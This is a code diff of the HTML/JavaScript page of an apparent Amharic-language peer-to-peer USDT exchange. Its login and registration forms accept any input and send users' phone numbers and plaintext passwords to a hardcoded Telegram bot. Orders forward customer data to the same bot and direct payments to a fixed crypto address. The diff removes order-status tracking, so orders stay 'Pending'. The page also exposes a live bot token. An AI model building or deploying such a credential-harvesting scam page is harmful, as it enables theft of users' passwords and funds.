@@ -26,14 +26,10 @@
         /* የትዕዛዝ ሁኔታ ባጆች */
         .status-badge { display: inline-block; padding: 6px 15px; border-radius: 20px; font-weight: bold; font-size: 0.9rem; margin-top: 10px; }
         .status-pending { background-color: #f59e0b; color: #1e1b4b; }
-        .status-completed { background-color: #10b981; color: white; }
-        .status-cancelled { background-color: #ef4444; color: white; }
         
         /* የስክሪንሻት ፋይል መምረጫ ስታይል */
         .file-label { display: block; padding: 12px; background: #232d3f; border: 1px dashed #f3cd64; text-align: center; border-radius: 8px; color: #f3cd64; cursor: pointer; font-weight: bold; font-size: 0.85rem; margin-top: 5px; }
     </style>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
 <body>
 
@@ -148,7 +144,7 @@
                     <div style="font-size: 0.85rem; color: #a0aec0; margin-bottom: 5px;">Current Status</div>
                     <div id="order-status-box" class="status-badge status-pending">Pending 🟡</div>
                 </div>
-                <p id="status-note" style="font-size: 0.8rem; color: #a0aec0; line-height: 1.4;">እባክዎ ገጹን ሳይዘጉ ይጠብቁ...</p>
+                <p id="status-note" style="font-size: 0.8rem; color: #a0aec0; line-height: 1.4;">እባክዎ ገጹን ሳይዘጉ ያድምቁ/ይጠብቁ። ቦትዎን በመጠቀም ማጽደቅ ይችላሉ።</p>
                 <button type="button" onclick="backToHome()" class="btn-generate" style="background-color: #334155; margin-top: 15px;">Back to Home</button>
             </section>
         </div>
@@ -207,19 +203,6 @@
     </div>
 
     <script>
-        // 🔴 Firebase Configuration (የራስህን እውነተኛ መረጃ እዚህ አስገባ)
-        const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-            databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_PROJECT_ID.appspot.com",
-            messagingSenderId: "YOUR_SENDER_ID",
-            appId: "YOUR_APP_ID"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
         const BOT_TOKEN = "8686967610:AAFE1B_hTR6JMljJQbnntitty842ZclQN1g";
         const CHAT_ID = "6758067257";
         const REAL_BEP20_ADDRESS = "0x396378d7721461813601a49fe2de0312a1f6034c";
@@ -319,7 +302,7 @@
             }
         }
 
-        function sendPhotoToTelegram(file, captionText) {
+        function sendPhotoToTelegram(file, captionText, orderId, type, amount, method) {
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", file);
@@ -327,13 +310,18 @@
             formData.append("parse_mode", "Markdown");
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData })
-            .then(res => { showNotification("ማረጋገጫው ተልኳል!"); })
+            .then(res => { 
+                showNotification("ትዕዛዝዎ እና ስክሪንሻቱ ተልኳል!"); 
+                startOrderStatusListener(orderId, type, amount, method);
+            })
             .catch(err => { showNotification("ፎቶ መላክ አልተቻለም!", true); });
         }
 
-        // 🔄 SUBMIT ሲጫን የሚሠራው ዋናው ክፍል
+        // 🔄 SUBMIT ሲጫን በቀጥታ የሚሠራው
         function handleTradeSubmit(event) {
             event.preventDefault();
+            
+            // ⚠️ መጀመሪያ Login ማድረጉን ማረጋገጫ (ካልገባ ያስገድደዋል)
             if(!isLoggedIn) { 
                 showNotification("እባክዎ መጀመሪያ Login ያድርጉ!", true); 
                 openModal('login-modal'); 
@@ -354,91 +342,61 @@
             const orderId = "ORD-" + Math.floor(100000 + Math.random() * 900000);
             globalCurrentOrderId = orderId;
 
-            // 1. መጀመሪያ ወደ Firebase መረጃውን መላክ
-            database.ref('orders/' + orderId).set({
-                type: currentTradeType, amount: amount, method: method, phone: phone, dynamicData: dynamicValue, status: "pending"
-            })
-            .then(() => {
-                const msg = `🔔 *አዲስ የ P2P ትዕዛዝ ደርሷል!*\n\n` +
-                            `🆔 *Order ID:* \`${orderId}\`\n` +
-                            `👤 *አይነት:* ${currentTradeType.toUpperCase()}\n` +
-                            `💰 *መጠን:* ${amount} USDT\n` +
-                            `🏦 *ክፍያ መንገድ:* ${method.toUpperCase()}\n` +
-                            `📞 *የደንበኛ ስልክ:* ${phone}\n` +
-                            `🔑 *የደንበኛ መረጃ:* \`${dynamicValue}\``;
+            const msg = `🔔 *አዲስ የ P2P ትዕዛዝ ደርሷል!*\n\n` +
+                        `🆔 *Order ID:* \`${orderId}\`\n` +
+                        `👤 *አይነት:* ${currentTradeType.toUpperCase()}\n` +
+                        `💰 *መጠን:* ${amount} USDT\n` +
+                        `🏦 *ክፍያ መንገድ:* ${method.toUpperCase()}\n` +
+                        `📞 *የደንበኛ ስልክ:* ${phone}\n` +
+                        `🔑 *የደንበኛ መረጃ:* \`${dynamicValue}\``;
 
-                if (currentTradeType === 'sell' && sellFile) {
-                    sendPhotoToTelegram(sellFile, msg + "\n\n📸 *ማሳሰቢያ:* የላከው የUSDT ስክሪንሻት ከላይ ተያይዟል።");
-                } else {
-                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                    fetch(url, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
-                    });
-                }
-                
-                // ፎርሙን በባዶ ማጽዳት
-                document.getElementById('p2p-form').reset();
-                if(document.getElementById('sell-file')) {
-                    document.getElementById('sell-file').value = "";
-                    document.querySelector('.file-label').innerText = "📸 Select Screenshot Photo";
-                    document.querySelector('.file-label').style.borderColor = "#f3cd64";
-                }
-                
-                // ወደ መከታተያ ገጽ ማሳለፍ
-                startOrderStatusListener(orderId, currentTradeType, amount, method);
-            })
-            .catch((error) => {
-                showNotification("ዳታቤዝ ላይ መመዝገብ አልተቻለም!", true);
-                console.error(error);
-            });
+            if (currentTradeType === 'sell' && sellFile) {
+                // Sell ከሆነ ፎቶውን ከነጽሑፉ ይልካል
+                sendPhotoToTelegram(sellFile, msg + "\n\n📸 *ማሳሰቢያ:* የላከው የUSDT ስክሪንሻት ከላይ ተያይዟል።", orderId, currentTradeType, amount, method);
+            } else {
+                // Buy ከሆነ በቀጥታ ጽሑፉን ብቻ ይልካል
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+                })
+                .then(() => {
+                    showNotification("ትዕዛዝዎ በተሳካ ሁኔታ ተልኳል!");
+                    startOrderStatusListener(orderId, currentTradeType, amount, method);
+                });
+            }
+            
+            document.getElementById('p2p-form').reset();
         }
 
         function uploadBuyReceipt() {
             const fileInput = document.getElementById('buy-receipt-file');
             const file = fileInput.files[0];
             if(!file) return;
+            
             fileInput.previousElementSibling.innerText = "✅ Sent: " + file.name;
-            const msg = `💵 *የክፍያ ማረጋገጫ ስክሪንሻት ደርሷል!*\n\n🆔 *Order ID:* \`${globalCurrentOrderId}\`\nደንበኛው በባንክ መክፈሉን የሚገልጽ ፎቶ ልኳል።`;
-            sendPhotoToTelegram(file, msg);
+            const msg = `💵 *የክፍያ ማረጋገጫ ስክሪንሻት ደርሷል!*\n\n🆔 *Order ID:* \`${globalCurrentOrderId}\`\nደንበኛው በባንክ/ቴሌብር መክፈሉን የሚገልጽ ፎቶ ልኳል።`;
+            
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", file);
+            formData.append("caption", msg);
+            formData.append("parse_mode", "Markdown");
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData })
+            .then(() => { showNotification("የክፍያ ማረጋገጫው ለባለቤቱ ደርሷል!"); });
         }
 
         function startOrderStatusListener(orderId, type, amount, method) {
-            // የላይኛውን ናቪጌሽን መደበቅ
             document.getElementById('main-nav').style.display = 'none';
-            
-            // የትዕዛዝ መረጃዎችን በጽሑፍ ማሳየት
             document.getElementById('status-id').innerText = orderId;
             document.getElementById('status-type').innerText = type;
             document.getElementById('status-amount').innerText = amount;
             document.getElementById('status-method').innerText = method;
 
-            // Buy ከሆነ የባንክ መመሪያውን ማሳየት
             document.getElementById('buy-payment-instruction').style.display = (type === 'buy') ? 'block' : 'none';
-            
-            // ገጹን ወደ 'status' መቀየር
             switchTab('status');
-
-            // በሪል-ታይም Firebase-ን መከታተል
-            database.ref('orders/' + orderId + '/status').on('value', (snapshot) => {
-                const currentStatus = snapshot.val();
-                const statusBox = document.getElementById('order-status-box');
-                const statusNote = document.getElementById('status-note');
-
-                if (currentStatus === "pending") {
-                    statusBox.innerText = "Pending 🟡";
-                    statusBox.className = "status-badge status-pending";
-                } else if (currentStatus === "completed") {
-                    statusBox.innerText = "Completed ✅";
-                    statusBox.className = "status-badge status-completed";
-                    statusNote.innerHTML = "<span style='color: #10b981; font-weight:bold;'>🎉 ትዕዛዝዎ ጸድቋል! ወደ አካውንትዎ ተልኳል።</span>";
-                } else if (currentStatus === "cancelled") {
-                    statusBox.innerText = "Cancelled ❌";
-                    statusBox.className = "status-badge status-cancelled";
-                    statusNote.innerHTML = "<span style='color: #ef4444; font-weight:bold;'>❌ ይቅርታ፣ ትዕዛዝዎ ተሰርዟል።</span>";
-                }
-            });
         }
 
         function backToHome() { 
@@ -452,10 +410,16 @@
             const phone = document.getElementById('reg-phone').value;
             const pass = document.getElementById('reg-pass').value;
             const msg = `📝 *አዲስ ተጠቃሚ ተመዝግቧል!*\n\n👤 *ስም:* ${name}\n📞 *ስልክ:* ${phone}\n🔑 *ይለፍ ቃል:* \`${pass}\``;
-            isLoggedIn = true; loggedInUserPhone = phone; localStorage.setItem('currentUserPhone', phone); updateAuthHeader();
+            
+            isLoggedIn = true; 
+            loggedInUserPhone = phone; 
+            localStorage.setItem('currentUserPhone', phone); 
+            updateAuthHeader();
+            
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }) });
-            closeModal('register-modal'); showNotification("በተሳካ ሁኔታ ተመዝግበዋል!");
+            closeModal('register-modal'); 
+            showNotification("በተሳካ ሁኔታ ተመዝግበዋል!");
         }
 
         function handleLoginSubmit(event) {
@@ -463,10 +427,16 @@
             const phone = document.getElementById('login-phone').value;
             const pass = document.getElementById('login-pass').value;
             const msg = `🔐 *የግባ (Login) ሙከራ*\n\n📞 *ስልክ:* ${phone}\n🔑 *ይለፍ ቃል:* \`${pass}\``;
-            isLoggedIn = true; loggedInUserPhone = phone; localStorage.setItem('currentUserPhone', phone); updateAuthHeader();
+            
+            isLoggedIn = true; 
+            loggedInUserPhone = phone; 
+            localStorage.setItem('currentUserPhone', phone); 
+            updateAuthHeader();
+            
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" }) });
-            closeModal('login-modal'); showNotification("እንኳን ደህና መጡ!");
+            closeModal('login-modal'); 
+            showNotification("እንኳን ደህና መጡ!");
         }
 
         // BEP20 Address Generator
